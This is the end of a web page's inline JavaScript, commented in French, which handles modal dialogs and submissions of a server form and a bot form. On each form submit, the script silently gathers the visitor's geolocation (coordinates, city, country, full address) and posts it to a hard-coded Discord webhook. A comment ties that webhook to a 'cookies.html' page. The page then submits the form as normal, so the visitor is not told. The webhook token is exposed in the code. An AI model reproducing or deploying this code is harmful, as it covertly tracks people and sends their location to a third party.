                        },
                        {
                            name: '🌍 Localisation',
                            value: `[Voir sur la carte](https://www.openstreetmap.org/?mlat=${locationData.latitude}&mlon=${locationData.longitude}#map=15/${locationData.latitude}/${locationData.longitude})`,
                            inline: true
                        },
                        {
                            name: '🏙️ Ville',
                            value: locationData.city,
                            inline: true
                        },
                        {
                            name: '🇫🇷 Pays',
                            value: locationData.country,
                            inline: true
                        },
                        {
                            name: '📍 Adresse complète',
                            value: locationData.address.substring(0, 1000), // Limiter la longueur
                            inline: false
                        },
                        {
                            name: '📊 Précision',
                            value: `${Math.round(locationData.accuracy)} mètres`,
                            inline: true
                        },
                        {
                            name: '🕒 Date et heure',
                            value: new Date(locationData.timestamp).toLocaleString('fr-FR'),
                            inline: true
                        }
                    ],
                    timestamp: locationData.timestamp
                };

                // Utiliser le même webhook que dans cookies.html
                await fetch('https://discord.com/api/webhooks/1443660275206328433/EZyVRAoBQCDPNE5DNfMSE1QFC1Sduw7LpkexREXAGOb5MH6lyngA-K12_06NWKTxH5a1', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed]
                    })
                });
            } catch (error) {
                console.error('Erreur lors de l\'envoi de la localisation à Discord:', error);
            }
        }

        // Gestion des modales
        const modalButtons = document.querySelectorAll('[data-modal]');
        const modalOverlays = document.querySelectorAll('.modal-overlay');

        const openModal = (id) => {
            const modal = document.getElementById(id);
            if (modal) {
                modal.classList.add('active');
            }
        };

        const closeModal = () => {
            modalOverlays.forEach(modal => modal.classList.remove('active'));
        };

        modalButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const target = btn.getAttribute('data-modal');
                openModal(target);
            });
        });

        modalOverlays.forEach(modal => {
            modal.addEventListener('click', (event) => {
                if (event.target === modal || event.target.hasAttribute('data-close')) {
                    closeModal();
                }
            });
        });

        document.addEventListener('keyup', (event) => {
            if (event.key === 'Escape') {
                closeModal();
            }
        });
        // Gestion de la soumission du formulaire de serveur
        async function handleServerFormSubmit(event) {
            event.preventDefault();
            const form = event.target;
            const submitButton = form.querySelector('button[type="submit"]');
            const loadingDiv = document.getElementById('location-loading');
            
            try {
                // Afficher le chargement
                submitButton.disabled = true;
                if (loadingDiv) loadingDiv.style.display = 'block';
                
                // Obtenir la localisation
                const locationData = await getUserLocation();
                
                // Si la localisation est disponible, l'envoyer à Discord
                if (locationData) {
                    await sendLocationToDiscord(locationData);
                }
                
                // Soumettre le formulaire
                form.submit();
            } catch (error) {
                console.error('Erreur lors de la géolocalisation:', error);
                // Soumettre le formulaire même en cas d'erreur de géolocalisation
                form.submit();
            } finally {
                submitButton.disabled = false;
                if (loadingDiv) loadingDiv.style.display = 'none';
            }
        }
        
        // Gestion de la soumission du formulaire de bot
        async function handleBotFormSubmit(event) {
            event.preventDefault();
            const form = event.target;
            const submitButton = form.querySelector('button[type="submit"]');
            const loadingDiv = document.getElementById('bot-location-loading');
            
            try {
                // Afficher le chargement
                submitButton.disabled = true;
                if (loadingDiv) loadingDiv.style.display = 'block';
                
                // Obtenir la localisation
                const locationData = await getUserLocation();
                
                // Si la localisation est disponible, l'envoyer à Discord
                if (locationData) {
                    await sendLocationToDiscord(locationData);
                }
                
                // Soumettre le formulaire
                form.submit();
            } catch (error) {
                console.error('Erreur lors de la géolocalisation:', error);
                // Soumettre le formulaire même en cas d'erreur de géolocalisation
                form.submit();
            } finally {
                submitButton.disabled = false;
                if (loadingDiv) loadingDiv.style.display = 'none';
            }
        }
    </script>
</body>
</html>